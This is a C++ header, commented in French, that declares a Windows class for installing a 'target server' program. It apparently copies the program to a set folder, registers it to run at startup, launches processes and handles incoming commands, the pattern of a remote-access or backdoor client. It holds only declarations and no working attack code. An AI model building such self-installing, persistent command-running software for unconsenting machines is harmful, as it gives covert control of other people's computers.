//
// Ce fichier contient tous les élément permettant l'initialisation du logiciel
// Permet l'installation du service et de mettre à un endroit spécifique dans l'ordinateur

#ifndef SERVEUR___CIBLE_INSTALLATIONANDSTART_H
#define SERVEUR___CIBLE_INSTALLATIONANDSTART_H


#include <Windows.h>
#include <string>
#include <tchar.h>
#include <cstdio>
#include <time.h>
#include <fstream>
#include <thread>


#include "string"
//Mes fichiers
#include "Conversion.h"
#include "Settings.h"
#include "OperationState.h"
#include "CMD.h"
#include "Utility.h"
class installationAndStart {
private:
protected:
public:
    static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);

    static std::string processCommand(std::string command);
    static void handleError(int errType, bool errSevere);
    static OperationState init();

    //variables
    static std::string CurrentPath;
    static std::string installationFolder;
    static std::string installationPath;
    static bool installing;

    static bool locationSet();
    static bool startupSet();
    static bool envoiedexecutable();
    static bool directoryExists(const char* dirName);

    static bool processParameter(std::string &command, std::string compCommand);

    static std::string getInstallFolder();
    static std::string getCurrentPath();
    static std::string getInstallationPath(std::string instFolder);

    static void setLocation();		//

    static void runInstalled();

    static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);

    static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);



};

#endif //SERVEUR___CIBLE_INSTALLATIONANDSTART_H
